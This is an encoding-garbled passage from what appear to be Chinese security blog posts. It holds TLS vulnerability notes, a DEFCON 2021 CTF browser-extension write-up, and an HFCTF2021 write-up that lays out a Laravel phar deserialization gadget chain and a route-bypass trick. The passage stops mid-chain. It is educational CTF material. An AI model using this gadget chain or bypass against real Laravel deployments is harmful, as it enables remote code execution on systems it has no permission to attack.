Cookieã€‚åœ¨æˆåŠŸè¯»å–èº«ä»½éªŒè¯CookieåŽï¼Œæ”»å‡»è€…å¯ä»¥å®žè¡Œä¼šè¯åŠ«æŒå’Œå‘åŠ¨è¿›ä¸€æ­¥æ”»å‡»ã€‚\nSSL åŽ‹ç¼©åœ¨ä¸‹è¿°ç‰ˆæœ¬æ˜¯é»˜è®¤å…³é—­çš„ï¼š nginx 1.1.6åŠæ›´é«˜/1.0.9åŠæ›´é«˜ï¼ˆå¦‚æžœä½¿ç”¨äº† OpenSSL 1.0.0åŠæ›´é«˜ï¼‰ï¼Œ nginx 1.3.2åŠæ›´é«˜/1.2.2åŠæ›´é«˜ï¼ˆå¦‚æžœä½¿ç”¨è¾ƒæ—§ç‰ˆæœ¬çš„ OpenSSLï¼‰ã€‚\nå¦‚æžœä½ ä½¿ç”¨ä¸€ä¸ªæ—©æœŸç‰ˆæœ¬çš„ nginx æˆ– OpenSSLï¼Œè€Œä¸”ä½ çš„å‘è¡Œç‰ˆæ²¡æœ‰å‘åŽç§»æ¤è¯¥é€‰é¡¹ï¼Œé‚£ä¹ˆä½ éœ€è¦é‡æ–°ç¼–è¯‘æ²¡æœ‰ä¸€ä¸ª ZLIB æ”¯æŒçš„ OpenSSLã€‚è¿™ä¼šç¦æ­¢ OpenSSL ä½¿ç”¨ DEFLATE åŽ‹ç¼©æ–¹å¼ã€‚å¦‚æžœä½ ç¦ç”¨äº†è¿™ä¸ªï¼Œä½ ä»ç„¶å¯ä»¥ä½¿ç”¨å¸¸è§„çš„ HTML DEFLATE åŽ‹ç¼©ã€‚\nPOODLEæ¼æ´žï¼ˆå·æ¯›ç‹—æ”»å‡»ï¼‰2014å¹´10æœˆ14å·ç”±Googleå‘çŽ°çš„POODLEæ¼æ´žï¼Œå…¨ç§°æ˜¯Padding Oracle On Downloaded Legacy Encryption vulnerabilityï¼Œåˆè¢«ç§°ä¸ºâ€œè´µå®¾çŠ¬æ”»å‡»â€ï¼ˆCVE-2014-3566ï¼‰ï¼ŒPOODLEæ¼æ´žåªå¯¹CBCæ¨¡å¼çš„æ˜Žæ–‡è¿›è¡Œäº†èº«ä»½éªŒè¯ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹å¡«å……å­—èŠ‚è¿›è¡Œå®Œæ•´æ€§éªŒè¯ï¼Œæ”»å‡»è€…çªƒå–é‡‡ç”¨SSL3.0ç‰ˆåŠ å¯†é€šä¿¡è¿‡ç¨‹ä¸­çš„å†…å®¹ï¼Œå¯¹å¡«å……å­—èŠ‚ä¿®æ”¹å¹¶ä¸”åˆ©ç”¨é¢„ç½®å¡«å……æ¥æ¢å¤åŠ å¯†å†…å®¹ï¼Œä»¥è¾¾åˆ°æ”»å‡»ç›®çš„ã€‚\nTLS POODLEï¼ˆTLSå·æ¯›ç‹—æ”»å‡»ï¼‰TLS POODLE(CVE-2014-8730) è¯¥æ¼æ´žçš„åŽŸç†å’ŒPOODLEæ¼æ´žçš„åŽŸç†ä¸€è‡´ï¼Œä½†ä¸æ˜¯SSL3åè®®ã€‚ç”±äºŽTLSå¡«å……æ˜¯SSLv3çš„ä¸€ä¸ªå­é›†ï¼Œå› æ­¤å¯ä»¥é‡æ–°ä½¿ç”¨é’ˆå¯¹TLSçš„POODLEæ”»å‡»ã€‚TLSå¯¹äºŽå®ƒçš„å¡«å……æ ¼å¼æ˜¯éžå¸¸ä¸¥æ ¼çš„ï¼Œä½†æ˜¯ä¸€äº›TLSå®žçŽ°åœ¨è§£å¯†ä¹‹åŽä¸æ‰§è¡Œå¡«å……ç»“æž„çš„æ£€æŸ¥ã€‚å³ä½¿ä½¿ç”¨TLSä¹Ÿä¸ä¼šå®¹æ˜“å—åˆ°POODLEæ”»å‡»çš„å½±å“ã€‚\nCCSCCS(CVE-2014-0224) å…¨ç§°openssl MITM CCS injection attackï¼ŒOpenssl 0.9.8zaä¹‹å‰çš„ç‰ˆæœ¬ã€1.0.0mä¹‹å‰çš„ä»¥åŠ1.0.1hä¹‹å‰çš„opensslæ²¡æœ‰é€‚å½“çš„é™åˆ¶ChangeCipherSpecä¿¡æ¯çš„å¤„ç†ï¼Œè¿™å…è®¸ä¸­é—´äººæ”»å‡»è€…åœ¨é€šä¿¡ä¹‹é—´ä½¿ç”¨0é•¿åº¦çš„ä¸»å¯†é’¥ã€‚\nFREAKFREAK(CVE-2015-0204) å®¢æˆ·ç«¯ä¼šåœ¨ä¸€ä¸ªå…¨å®‰å…¨å¼ºåº¦çš„RSAæ¡æ‰‹è¿‡ç¨‹ä¸­æŽ¥å—ä½¿ç”¨å¼±å®‰å…¨å¼ºåº¦çš„å‡ºå£RSAå¯†é’¥ï¼Œå…¶ä¸­å…³é”®åœ¨äºŽå®¢æˆ·ç«¯å¹¶æ²¡æœ‰å…è®¸åå•†ä»»ä½•å‡ºå£çº§åˆ«çš„RSAå¯†ç å¥—ä»¶ã€‚\nDROWNï¼ˆæººæ°´æ”»å‡»/æººäº¡æ”»å‡»ï¼‰2016å¹´3æœˆå‘çŽ°çš„é’ˆå¯¹TLSçš„æ–°æ¼æ´žæ”»å‡»â€”â€”DROWNï¼ˆDecrypting RSA with Obsolete and Weakened eNcryptionï¼ŒCVE-2016-0800ï¼‰ï¼Œä¹Ÿå³åˆ©ç”¨è¿‡æ—¶çš„ã€å¼±åŒ–çš„ä¸€ç§RSAåŠ å¯†ç®—æ³•æ¥è§£å¯†ç ´è§£TLSåè®®ä¸­è¢«è¯¥ç®—æ³•åŠ å¯†çš„ä¼šè¯å¯†é’¥ã€‚ å…·ä½“è¯´æ¥ï¼ŒDROWNæ¼æ´žå¯ä»¥åˆ©ç”¨è¿‡æ—¶çš„SSLv2åè®®æ¥è§£å¯†ä¸Žä¹‹å…±äº«ç›¸åŒRSAç§é’¥çš„TLSåè®®æ‰€ä¿æŠ¤çš„æµé‡ã€‚ DROWNæ”»å‡»ä¾èµ–äºŽSSLv2åè®®çš„è®¾è®¡ç¼ºé™·ä»¥åŠçŸ¥åçš„Bleichenbacheræ”»å‡»ã€‚\né€šå¸¸æ£€æŸ¥ä»¥ä¸‹ä¸¤ç‚¹æœåŠ¡å™¨çš„é…ç½®\n\næœåŠ¡å™¨å…è®¸SSL2è¿žæŽ¥ï¼Œéœ€è¦å°†å…¶å…³é—­ã€‚\nç§é’¥åŒæ—¶ç”¨äºŽå…è®¸SSL2è¿žæŽ¥çš„å…¶ä»–æœåŠ¡å™¨ã€‚ä¾‹å¦‚ï¼ŒWebæœåŠ¡å™¨å’Œé‚®ä»¶æœåŠ¡å™¨ä¸Šä½¿ç”¨ç›¸åŒçš„ç§é’¥å’Œè¯ä¹¦ï¼Œå¦‚æžœé‚®ä»¶æœåŠ¡å™¨æ”¯æŒSSL2ï¼Œå³ä½¿webæœåŠ¡å™¨ä¸æ”¯æŒSSL2ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨é‚®ä»¶æœåŠ¡å™¨æ¥ç ´åä¸ŽwebæœåŠ¡å™¨çš„TLSè¿žæŽ¥ã€‚\n\nOpenssl Padding OracleOpenssl Padding Oracle(CVE-2016-2107) openssl 1.0.1tåˆ°openssl 1.0.2hä¹‹å‰æ²¡æœ‰è€ƒè™‘æŸäº›å¡«å……æ£€æŸ¥æœŸé—´çš„å†…å­˜åˆ†é…ï¼Œè¿™å…è®¸è¿œç¨‹æ”»å‡»è€…é€šè¿‡é’ˆå¯¹AES CBCä¼šè¯çš„padding-oracleæ”»å‡»æ¥èŽ·å–æ•æ„Ÿçš„æ˜Žæ–‡ä¿¡æ¯ã€‚\nå‚è€ƒèµ„æ–™\nhttps://segmentfault.com/a/1190000012731888\nhttps://segmentfault.com/a/1190000021559557\nhttps://zhuanlan.zhihu.com/p/22142170\nhttps://juejin.cn/post/6844904089495535624#heading-14\nhttps://zhuanlan.zhihu.com/p/22917510\nhttps://payloads.online/archivers/2018-04-27/5\n\n","categories":[],"tags":[]},{"title":"DEFCON 2021 Quals threefactooorx","url":"/20210503/DEFCON-2021-Quals-threefactooorx/","content":"DEFCON 2021 Quals threefactooorxç›´æŽ¥è½¬ 4qE çš„äº† 233\nåæ··æ·†æ’ä»¶æºç çš„ä¸»è¦éƒ¨åˆ†åœ¨ content_script.jsï¼Œ ä½†å› ä¸ºç»è¿‡æ··æ·†ï¼Œæ ¹æœ¬ä¸æ˜¯ç»™äººçœ‹çš„ï¼ŒäºŽæ˜¯å¾—å…ˆåæ··æ·†ã€‚è€ƒè™‘åˆ° js æœ¬èº«å°±æ˜¯è§£é‡Šåž‹è¯­è¨€ï¼Œæˆ‘å¯ä»¥ç›´æŽ¥åœ¨ chrome devtools ä¸­ä¸‹æ–­ç‚¹ï¼Œç„¶åŽåœ¨ console é‡Œæ‰“å°æˆ‘æƒ³è¦çš„å˜é‡å€¼ã€‚æœ€å¤–å±‚çš„å‡½æ•°ä¸æ˜¯ç‰¹åˆ«å¤šï¼Œæ‰€ä»¥ä¾æ¬¡ä¸‹æ–­ç‚¹é…åˆ devtools çš„æŽ§åˆ¶å°èŽ·å–å˜é‡ã€‚\nè¿™æ®µè¿‡ç¨‹éƒ½æ˜¯ä½“åŠ›æ´»ï¼Œå°±ä¸å…·ä½“æè¿°äº†ï¼Œæœ€åŽåæ··æ·†å‡ºäº†å¤§è‡´èƒ½çœ‹çš„ js ä»£ç  readable_code.jsã€‚\næœ€åŽçœ‹ä¸‹æ¥ï¼Œåæ··æ·†çš„éƒ¨åˆ†æ˜¯æœ€é‡è¦çš„ï¼Œå› ä¸ºåŽé¢çš„åˆ†æžéƒ½ä¸æ˜¯å¾ˆéš¾ã€‚\næœ¬åœ°åˆ†æžåæ··æ·†ä»¥åŽï¼Œå¯ä»¥çœ‹åˆ°åœ¨æºç çš„æœ€åŽæœ‰ä¸€æ®µä»£ç ä¼šå®šæ—¶å‘åŽå°èŽ·å– flag å¹¶è¾“å‡ºã€‚\nobserver[\"observe\"](document, config),\n    console[\"log\"](\"The observer is observing.\"),\n    setTimeout(function() &#123;\n      const _0xd26915 = &#123;&#125;;\n      _0xd26915[\"getflag\"] = _0x10b2d5[\"xOsuT\"], //true\n          chrome[\"runtime\"][\"sendMessage\"](_0xd26915, function(_0x336e82) &#123;\n            // _0x336382 is response from backend included with flag\n            FLAG = _0x336e82[\"flag\"],\n                console['log']((\"flag: \" + _0x336e82[\"flag\"]));\n\n            // four &amp;&amp; and display flag on the #thirdfactooor\n            nodesadded == 5 &amp;&amp; (nodesdeleted == 3) &amp;&amp; \\\n            attrcharsadded == 23 &amp;&amp; (domvalue == 2188) &amp;&amp; \\\n             (document[\"getElementById\"](\"thirdfactooor\")['value'] = _0x336e82[\"flag\"]);\n\n            // append new div\n            const _0x369bcb = document[\"createElement\"](\"div\");\n            _0x369bcb[\"setAttribute\"](\"id\", \"processed\"),\n                document[\"body\"][\"appendChild\"](_0x369bcb);\n          &#125;);\n    &#125;, 500);\n\nå…¶ä¸­è¿™ä¸ª document[&quot;getElementById&quot;](&quot;thirdfactooor&quot;) æ˜¯åœ¨ check_dom() ä¼šè¿›è¡Œçš„ä¸€é¡¹æ£€æŸ¥ï¼Œæˆ‘ä»¬éœ€è¦è®© html ä¸­æœ‰ä¸€ä¸ª id ä¸º thirdfactooor çš„ input æ ‡ç­¾ã€‚\nif (document[\"querySelector\"](\"thirdfactooor\")[\"tagName\"] == \"INPUT\") &#123;&#125;\n\nåªéœ€è¦æ»¡è¶³\nnodesadded == 5 &amp;&amp; (nodesdeleted == 3) &amp;&amp; attrcharsadded == 23 &amp;&amp; (domvalue == 2188)\n\nä¾æ¬¡æ‰¾åˆ°èµ‹å€¼çš„åœ°æ–¹\n/*\n > _0x8a010b instanceof MutationRecord\n &lt;Â· true\n*/\nif (_0x8a010b[\"type\"] === \"childList\") &#123;\n    if (false) &#123;\n        // never execute\n    &#125; else &#123;\n        nodesadded += _0x8a010b[\"addedNodes\"][\"length\"],\n        nodesdeleted += _0x8a010b[\"removedNodes\"][\"length\"];\n    &#125;\n&#125; else &#123;\n    if ((_0x8a010b[\"type\"] === \"attributes\")) &#123;\n        if (true) &#123;\n            attrcharsadded += _0x8a010b[\"attributeName\"][\"length\"];\n        &#125;\n    &#125;\n&#125;\n\nåœ¨è¿™é‡Œå­¦ä¹ äº†ä¸€ä¸‹ MutationRecord çš„å‡½æ•°ï¼ŒMutationRecord JavaScript APIã€‚ type ä¼šéšç€ä¸åŒçš„æ“ä½œæ”¹å˜\n\næ”¹å˜ Node.childNodes æ—¶ä¼šå˜æˆ childList\næ”¹å˜ Element.attribute æ—¶ä¼šå˜æˆ attributes\n\næŒ‰è¦æ±‚æˆ‘ä»¬éœ€è¦5æ¬¡èŠ‚ç‚¹å¢žåŠ ï¼Œ3æ¬¡èŠ‚ç‚¹ç§»é™¤ï¼Œæ”¹å˜çš„å±žæ€§åçš„é•¿åº¦æ€»å’Œä¸º23ã€‚\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è¿™æ®µèµ‹å€¼æ“ä½œå‰ï¼Œæœ‰ä¸€å¤„åˆ¤æ–­ä¼šå¯¼è‡´ç¨‹åºæå‰é€€å‡ºã€‚\nvar _0x5b12b9 = document[\"getElementById\"](\"3fa\");\n...\nif ((_0x8a010b[\"target\"] === _0x5b12b9) || \\\n_0x8a010b[\"target\"][\"parentNode\"] === _0x5b12b9 || \\\n_0x8a010b[\"target\"][\"parentNode\"][\"parentNode\"] === _0x5b12b9) &#123;&#125;\nelse return;\n\næ‰€ä»¥ id ä¸º #3fa çš„èŠ‚ç‚¹å¿…é¡»æ˜¯æ ¹èŠ‚ç‚¹ï¼ˆå¯ä»¥ç›´æŽ¥ç»™ &lt;html&gt; ï¼‰ã€‚\næŽ¥ä¸‹æ¥åœ¨è°ƒè¯•çš„æ—¶å€™è§‚å¯Ÿåˆ° domvalue ä¸Ž .html æ–‡ä»¶ä¸­çš„å­—æ•°æœ‰å…³ï¼Œå‡‘è¶³ä¸€å®šçš„å­—æ•°å³å¯ã€‚\n&lt;input id=\"thirdfactooor\" size=\"1000px\">\n&lt;script>\n    let fa = document.getElementsByTagName(\"html\")[0];\n    fa.setAttribute(\"id\", \"3fa\")\n    for(let i = 0; i &lt; 4; i++) &#123;\n        fa.lang = i; // 2 + 4 chars * 4 + 5\n    &#125;\n    let a = document.createElement(\"div\")\n    let b = document.createElement(\"div\")\n    let c = document.createElement(\"div\")\n    let d = document.createElement(\"div\")\n    let e = document.createElement(\"div\")\n    fa.appendChild(a)\n    fa.appendChild(b)\n    fa.appendChild(c)\n    fa.appendChild(d)\n    fa.appendChild(e)\n    fa.removeChild(a)\n    fa.removeChild(b)\n    fa.removeChild(c);\n    console.log(\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\")\n&lt;/script>\n\nç›´æŽ¥æ”¾åœ¨æœ¬åœ°è·‘ï¼ŒæˆåŠŸ\n\nCapture the flagè¿œç¨‹æœåŠ¡æä¾›äº†ä¸€ä¸ª /submit æŽ¥å£ï¼Œå¯ä»¥æäº¤æˆ‘ä»¬çš„ html æ–‡ä»¶ï¼Œç„¶åŽä¼šç”¨ç±»ä¼¼ç»™è¿™ä¸ª html â€œæ‹ç…§â€çš„æ–¹å¼ï¼Œä»¥å›¾ç‰‡æ ¼å¼è¿”å›žã€‚æœŸé—´ï¼Œ html æ–‡ä»¶é‡Œçš„ js ä»£ç éƒ½ä¼šæ‰§è¡Œï¼Œä½†æ˜¯ alert() ä¼šå¼•èµ·æŠ¥é”™ï¼ŒåŸºæœ¬æŽ’é™¤äº† XSS çš„å¯èƒ½ã€‚ç›´æŽ¥ä¸Šä¼ ï¼ŒDONE!\n\n\n","categories":[],"tags":["CTF WriteUp"]},{"title":"HFCTF2021 TinyPNG å¤çŽ°","url":"/20210429/HFCTF2021-TinyPNG/","content":"HFCTF2021 TinyPNGæ„Ÿè°¢ Naivekun å¸ˆå‚…çš„å¸®åŠ©\nå› ä¸ºé¢˜ç›®æ²¡æœ‰ç»™å…¨çŽ¯å¢ƒï¼Œæ‰€ä»¥è‡ªå·± docker æ­äº†ä¸ªçŽ¯å¢ƒï¼Œå’Œ Buu ä¸Šçš„å¥½åƒä¸å¤ªä¸€æ ·\ndocker çŽ¯å¢ƒæˆ‘ä¼šæ”¾åœ¨æˆ‘çš„ GitHub ä¸Šï¼Œå¤çŽ°çŽ¯å¢ƒ\n2021-05-18 æ›´æ–°ï¼šæ›´æ–°çš„éƒ¨åˆ†ï¼Œå¾€ä¸‹åˆ°ç»“å°¾ã€‚\nZeddYu å¸ˆå‚…è¯´å°† HTTP2 èµ°ç§çš„çŽ¯å¢ƒæ”¾åˆ° GitHub ä¸Šäº†ï¼ŒH2èµ°ç§çŽ¯å¢ƒ\né˜…è¯»æºç å…ˆé˜…è¯»æºç ï¼Œæžæ¸…æ¥šè¿™ä¸ª Web åº”ç”¨çš„å…·ä½“åŠŸèƒ½å’Œæµç¨‹\nLaravel æ¡†æž¶çš„é»˜è®¤è·¯ç”±ä½äºŽ routes/web.php ä¸‹ \n&lt;?php\n//...    \n\nRoute::get('/', function () &#123;\n    return view('upload');\n&#125;);\nRoute::post('/', [IndexController::class, 'fileUpload'])->name('file.upload.post');\n\n//Don't expose the /image to others!\nRoute::get('/image', [ImageController::class, 'handle'])->name('image.handle');\n\næ‰€ä»¥å¾ˆå®¹æ˜“å¾—åˆ°è¿™ä¸ªåº”ç”¨æœ‰ä¸‰æ¡è·¯ç”±\nç¬¬ä¸€æ¡è·¯ç”±æ˜¯è¿”å›ž upload é¡µé¢ï¼Œè§†å›¾æ–‡ä»¶ä½äºŽ resources/views/*\nå…¶ä»–ä¸¤æ¡è·¯ç”±ï¼Œåˆ†åˆ«çœ‹ä»–ä»¬å¯¹åº”çš„ç±»å’Œæ–¹æ³•ï¼Œä½äºŽ app/Http/Controllers/*\n# app/Http/Controllers/IndexController.php\n\n&lt;?php\n\nnamespace App\\Http\\Controllers;\n\nuse Illuminate\\Http\\Request;\n\nclass IndexController extends Controller\n&#123;\n    public function fileUpload(Request $req)\n    &#123;\n        $allowed_extension = \"png\";\n        $extension = $req->file('file')->clientExtension();\n        if($extension === $allowed_extension &amp;&amp; $req->file('file')->getSize() &lt; 204800)\n        &#123;\n            $content = $req->file('file')->get();\n            if (preg_match(\"/&lt;\\?|php|HALT\\_COMPILER/i\", $content ))&#123;\n                $error = 'Don\\'t do that, please';\n                return back()\n                    ->withErrors($error);\n            &#125;else &#123;\n                $fileName = \\md5(time()) . '.png';\n                $path = $req->file('file')->storePubliclyAs('uploads', $fileName);\n                echo \"path: $path\";\n                return back()\n                    ->with('success', 'File has been uploaded.')\n                    ->with('file', $path);\n            &#125;\n        &#125; else&#123;\n            $error = 'Don\\'t do that, please';\n            return back()\n                ->withErrors($error);\n        &#125;\n\n\n    &#125;\n&#125;\n\nIndexController çš„ fileUpload æ–¹æ³•å®žçŽ°äº†ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½\n\nä¸Šä¼ çš„æ–‡ä»¶åŽç¼€ååªèƒ½ä»¥ .png ç»“å°¾\n\nä¸Šä¼ çš„æ–‡ä»¶ä¼šè¢«å­˜å‚¨åœ¨ public/uploadsæ–‡ä»¶å¤¹å†…ï¼Œæ–‡ä»¶åä¸å¯æŽ§ï¼Œä¸º \\md5(time()) . &#39;.png&#39;\n\nå¯¹ &lt;?ã€phpã€HALT_COMPILER å­—ç¬¦ä¸²è¿›è¡Œäº†è¿‡æ»¤\n\nä¸Šä¼ æˆåŠŸåŽä¼šè¿”å›žå‚¨å­˜çš„è·¯å¾„\n\n\n# app/Http/Controllers/ImageController.php\n\n&lt;?php\n\nnamespace App\\Http\\Controllers;\n\nuse Illuminate\\Http\\Request;\n\nclass ImageController extends Controller\n&#123;\n    public function handle(Request $request)\n    &#123;\n        $source = $request->input('image');\n        if(empty($source))&#123;\n            return view('image');\n        &#125;\n        $temp = explode(\".\", $source);\n        $extension = end($temp);\n        if ($extension !== 'png') &#123;\n            $error = 'Don\\'t do that, pvlease';\n            return back()\n                ->withErrors($error);\n        &#125; else &#123;\n            $image_name = md5(time()) . '.png';\n            $dst_img = '/var/www/html/' . $image_name;\n            $percent = 1;\n            (new imgcompress($source, $percent))->compressImg($dst_img);\n            return back()->with('image_name', $image_name);\n        &#125;\n    &#125;\n&#125;\n\nImageController çš„ handle æ–¹æ³•å®žçŽ°äº†ä¸€ä¸ªåŽ‹ç¼©å›¾ç‰‡çš„åŠŸèƒ½\n\nå®žçŽ°äº†ï¼Œä½†åˆæ²¡æœ‰å®Œå…¨å®žçŽ°\nè¯»å– Request ä¸­ä¼ å…¥çš„ image ä½œä¸ºç›®æ ‡å›¾ç‰‡è·¯å¾„\nè¯»å–è¯¥å›¾ç‰‡ï¼Œè°ƒç”¨ imgcompress ç±»ä¸­çš„ compressImg æ–¹æ³•å¯¹å›¾ç‰‡è¿›è¡ŒåŽ‹ç¼©\nåŽ‹ç¼©å®ŒæˆåŽè¿”å›žå›¾ç‰‡çš„è·¯å¾„\n\nåœ¨æ¥çœ‹çœ‹è°ƒç”¨çš„ imgcompress ç±»ï¼Œå› ä¸ºæ¯”è¾ƒé•¿ï¼Œæ‰€ä»¥æˆªå–å…³é”®éƒ¨åˆ†è´´ä¸Šæ¥\n# app/Http/Controllers/imgcompress.php\n\n&lt;?php\n\nclass imgcompress\n&#123;\n\t//...\n    \n\t/**\n     * å†…éƒ¨ï¼šæ‰“å¼€å›¾ç‰‡\n     */\n    private function _openImage()\n    &#123;\n        list($width, $height, $type, $attr) = getimagesize($this->src);\n        $this->imageinfo = array(\n            'width' => $width,\n            'height' => $height,\n            'type' => image_type_to_extension($type, false),\n            'attr' => $attr\n        );\n        $fun = \"imagecreatefrom\" . $this->imageinfo['type'];\n        $this->image = $fun($this->src);\n        $this->_thumpImage();\n    &#125;\n    \n    //...\n&#125;\n\nåœ¨ _openImage æ–¹æ³•ä¸­ï¼Œgetimagesize å‡½æ•°ä¼šæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶\nè€Œä¸”åœ¨ PHP 4.0.5 æ”¯æŒåŽæ”¯æŒé€šè¿‡ URL æ‰“å¼€\n\näºŽæ˜¯è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥å¤¹å¸¦ç§è´§äº†ï¼Œæ¯”å¦‚è¯´ phar://\nä¿®æ´žå…ˆçœ‹è·¯ç”± routes/web.php\nRoute::get('/', function () &#123;\n    return view('upload');\n&#125;);\nRoute::post('/', [IndexController::class, 'fileUpload'])->name('file.upload.post');\n\n//Don't expose the /image to others!\nRoute::get('/image', [ImageController::class, 'handle'])->name('image.handle');\n\nå¯ä»¥çœ‹åˆ° //Don&#39;t expose the /image to others!\næ‰€ä»¥ä¿®æ´žå¾ˆç®€å•ï¼Œç›´æŽ¥æ³¨é‡ŠæŽ‰/imageè·¯ç”±å³å¯\næ‰“æ´žé¢˜ç›®ç»™äº†Apacheçš„é…ç½®æ–‡ä»¶ï¼Œå¼€å¯äº†ç›®å½•é‡å†™\næ‰€ä»¥è®¿é—®/index.php/imageå³å¯è®¿é—®åˆ°/imageè·¯ç”±\næˆ‘ä¸€å¼€å§‹çœ‹è¿™ä¸ªé¢˜ç›®é…äº† HTTPSï¼Œæƒ³èµ·æ¥ 4qE æ¯”èµ›ä¹‹å‰ç»™æˆ‘å‘çš„é‚£ç¯‡æŽ¨æ–‡ï¼Œä»¥ä¸ºè¦æ‰“ä¸€ä¸ªèµ°ç§ã€‚ç»“æžœæ˜¯è¿™æ ·å°±ç»•è¿‡äº†ã€‚\nç„¶åŽè¿™ä¸€é¢˜å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œå¯ä»¥è¯»å–æ–‡ä»¶ï¼Œæ‰“ä¸€ä¸ª phar ååºåˆ—åŒ–\nå‚è€ƒæ–‡ç« ï¼šä¸€é“CTFé¢˜å¼•èµ·çš„å¯¹laravel v8.32.1åºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æŽ˜\né¢˜ç›®çŽ¯å¢ƒé‡Œç»™å‡ºäº† Laravel çš„ç‰ˆæœ¬\n\"require\": &#123;\n        \"php\": \"^7.3|^8.0\",\n        \"fideloper/proxy\": \"^4.4\",\n        \"fruitcake/laravel-cors\": \"^2.0\",\n        \"guzzlehttp/guzzle\": \"^7.0.1\",\n        \"laravel/framework\": \"^8.12\",\n        \"laravel/tinker\": \"^2.5\"\n    &#125;,\n\næ‰€ä»¥ç…§æ–‡ç« æ‰¾ä¸€æ¡é“¾ä¸‹æ¥æ˜¯ä¸ªä¸é”™çš„é€‰æ‹©\nImportConfigurator ç±»ç¬¬ä¸€ä¸ªæ˜¯ Symfony\\Component\\Routing\\Loader\\Configurator ä¸­çš„ç±» ImportConfigurator\nè¯¥ç±»å­˜åœ¨ä¸€ä¸ªåŒ…å«äº†è¯­å¥ $this-&gt;xxx-&gt;xxx() çš„ __destruct æ–¹æ³•\nè¿™æ ·æˆ‘ä»¬å¯ä»¥æŽ§åˆ¶ $this-&gt;xxxï¼Œä»Žè€Œæ‰§è¡Œä¸€äº›é¢„æœŸä¹‹å¤–çš„æ–¹æ³•\n# vendor/symfony/routing/Loader/Configurator/ImportConfigurator.php\n\nclass ImportConfigurator\n&#123;\n    private $parent;\n    //...\n    public function __destruct()\n        &#123;\n            $this->parent->addCollection($this->route);\n        &#125;\n    //...\n&#125;\n\nå› ä¸ºå‡½æ•°åä¸å¯æŽ§ï¼Œæ‰¾ä¸€ä¸ªæœ‰ __call æ–¹æ³•çš„ç±»\næ¯”å¦‚è¯´ Faker ä¸­çš„ç±» ValidGenerator\nValidGenerator ç±»# vendor/fakephp/faker/src/Faker/ValidGenerator.php\n\nclass ValidGenerator\n&#123;\n    protected $generator;\n    protected $validator;\n    protected $maxRetries;\n    //...\n    public function __call($name, $arguments)\n        &#123;\n            $i = 0;\n            do &#123;\n                $res = call_user_func_array([$this->generator, $name], $arguments);\n                $i++;\n                if ($i > $this->maxRetries) &#123;\n                    throw new \\OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this->maxRetries));\n                &#125;\n            &#125; while (!call_user_func($this->validator, $res));\n\n            return $res;\n        &#125;\n    //...\n&#125;\n\né€‰ç”¨è¿™ä¸ªç±»æ˜¯å› ä¸ºè¿™ä¸ª __call æ–¹æ³•ä¸­åŒ…å«äº†æ¸…æ™°å¯è§çš„ call_user_func_array å’Œ call_user_func\nå¯ä»¥å‘çŽ° call_user_func çš„å‚æ•° $this-&gt;validator æ˜¯å¯æŽ§çš„\nè€Œå¦ä¸€ä¸ªå‚æ•° $res æ˜¯ä»Ž call_user_func_array å‡½æ•°ä¸­èŽ·å¾—çš„è¿”å›žå€¼\ncall_user_func_array çš„å‚æ•°ä¸­ï¼Œ$this-&gt;generator æ˜¯å¯æŽ§çš„\nä½†æˆ‘ä»¬æ— æ³•æŽ§åˆ¶ä»–çš„è¿”å›žå€¼ï¼Œå³æ— æ³•æŽ§åˆ¶ $res\nå¦ä¸€ä¸ªå‚æ•° $name æ˜¯ä¸å¯æŽ§çš„ï¼Œä¸”å€¼ä¸º addCollection\nå¦å¤–æˆ‘ä»¬ä¸ºäº†è§¦å‘ä¸€æ¬¡ call_user_funcï¼Œè¿™é‡Œé€‰æ‹©å°† $this-&gt;MaxRetries ç½®ä¸º 1 å³å¯\n\nDefaultGenerator ç±»æˆ‘ä»¬å†çœ‹åˆ° Faker ä¸­çš„ç±» DefaultGenerator\n# vendor/fakephp/faker/src/Faker/DefaultGenerator.php\n\nclass DefaultGenerator\n&#123;\n    protected $default;\n\t//...\n\tpublic function __call($method, $attributes)\n    \t&#123;\n        \treturn $this->default;\n    \t&#125;\n    //...\n&#125;\n\nè¿™é‡Œçš„ __call æ–¹æ³•ä¼šè¿”å›žä¸€ä¸ªæˆ‘ä»¬å®Œå…¨å¯æŽ§çš„ $this-&gt;default\näºŽæ˜¯åˆ°è¿™é‡Œï¼ŒValidGenerator ä¸­çš„ $res å‚æ•°å°±æ˜¯æˆ‘ä»¬å¯ä»¥æŽ§åˆ¶çš„äº†\nè°ƒç”¨é“¾æ¢³ç†ä¸€ä¸‹è°ƒç”¨é“¾\n&lt;?php\n\nclass ImportConfigurator\n&#123;\n    public function __destruct()\n    &#123;\n        $this->parent->addCollection($this->route);\n    &#125;\n&#125;\n\nclass ValidGenerator\n&#123;\n    public function __call($name, $arguments)\n    &#123;\n        $i = 0;\n        do &#123;\n            $res = call_user_func_array([$this->generator, $name], $arguments);\n            $i++;\n            if ($i > $this->maxRetries) &#123;\n                throw new \\OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this->maxRetries));\n            &#125;\n        &#125; while (!call_user_func($this->validator, $res));\n\n        return $res;\n    &#125;\n&#125;\n\nclass DefaultGenerator\n&#123;\n    public function __call($method, $attributes)\n        &#123;\n            return $this->default;\n        &#125;\n&#125;\n\n1ã€é€šè¿‡ ImportConfigurator ç±»çš„ __destruct æ–¹æ³•è§¦å‘ ValidGenerator ç±»çš„ __call æ–¹æ³•\n2ã€ValidGenerator ç±»çš„ __call æ–¹æ³•ä¸­çš„ call_user_func_array å‡½æ•°\n3ã€è§¦å‘ DefaultGenerator ç±»çš„ __call æ–¹æ³•\n4ã€DefaultGenerator ç±»çš„ __call æ–¹æ³•è¿”å›žå€¼å®Œå…¨å¯æŽ§\n5ã€ValidGenerator ç±»çš„ __call æ–¹æ³•ä¸­çš„ call_user_func_array å‡½æ•°è¿”å›žå€¼ $res å¯æŽ§\n6ã€ValidGenerator ç±»çš„ __call 